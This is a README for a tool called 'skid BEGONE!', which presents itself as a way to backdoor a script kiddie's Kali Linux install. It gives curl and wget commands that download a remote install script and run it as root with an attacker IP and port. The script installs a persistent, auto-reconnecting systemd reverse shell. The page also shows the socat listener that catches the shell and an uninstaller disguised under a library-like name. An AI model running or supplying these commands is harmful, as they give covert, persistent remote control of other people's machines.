# skid BEGONE!

How to backdoor a script kiddie's Kali Linux install within seconds. Alternatively: A way for very lazy people to add a reverse shell on their own system.

Please do not use this on innocent people. If you were to use this on your best friend, you'll be the greatest asshole of all time.

## Using the reverse shell

### Prerequisites

- you must obtain a root shell of some sort
- Some distro with systemd and a mutable filesystem

### Now running it...

Note: If you want the backdoored machine to reboot, append `reboot` to the commandline arguments.

```sh
curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/output/install.sh > /tmp/install.sh
bash /tmp/install.sh <IP> <PORT> [reboot]
```

alternatively with wget:

```sh
wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/output/install.sh -O /tmp/install.sh
bash /tmp/install.sh <IP> <PORT> [reboot]
```

By default the service will start alongside other system services. If the service can't connect to your server, it will wait for a few seconds and try to reconnect.

After you've got everything up and running, run this on your host: ```socat file:`tty`,raw,echo=0 tcp-listen:<PORT>```. Make sure you have port forwarding enabled.

### Uninstalling

In a root shell, run:

```sh
/usr/lib/linuxd.so.1
```